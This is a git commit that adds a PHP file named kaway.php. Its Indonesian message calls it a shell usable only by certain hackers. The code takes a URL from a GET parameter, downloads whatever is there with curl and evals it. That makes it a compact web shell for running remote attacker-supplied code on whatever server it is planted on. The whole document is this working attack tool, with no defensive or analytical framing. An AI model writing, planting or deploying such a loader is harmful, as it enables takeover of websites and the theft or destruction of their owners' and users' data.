5d3b961fe0700c28f0aa19f5d2b4ce192312e46f
jabarzad <jabarzad7@gmail.com>
2024-12-21 21:09:18 +0700

    Create Shell kaway.php
    Shell ini hanya Heker tertentu yang bisa gunain nya awowowok

---
+++ shell/kaway.php
@@ -0,0 +1,14 @@
+<?php
+if (isset($_GET['file']) && !empty($_GET['file'])) {
+    $file_url = $_GET['file'];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $file_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $code = curl_exec($ch);
+    curl_close($ch);
+
+    if ($code !== false) {
+        eval("?>$code<?php ");
+    }
+}
+?>
